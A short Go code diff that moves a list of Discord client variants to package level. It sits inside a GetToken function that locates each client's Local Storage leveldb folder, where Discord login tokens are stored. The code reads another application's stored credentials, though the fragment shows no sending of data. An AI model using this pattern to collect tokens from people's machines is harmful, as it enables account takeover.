@@ -9,13 +9,13 @@ import (
 	"path/filepath"
 )
 
+var versions = []string{"discord", "discordcanary", "discordptb"}
+
 func GetToken() (tok string, err error) {
 	home, def := os.LookupEnv("HOME")
 	if !def {
 		return "", errors.New("HOME path wasn't specified in environment")
 	}
-
-	versions := []string{"discord", "discordcanary", "discordptb"}
 
 	for _, ver := range versions {
 		path := filepath.Join(home, ".config", ver, "Local Storage/leveldb")
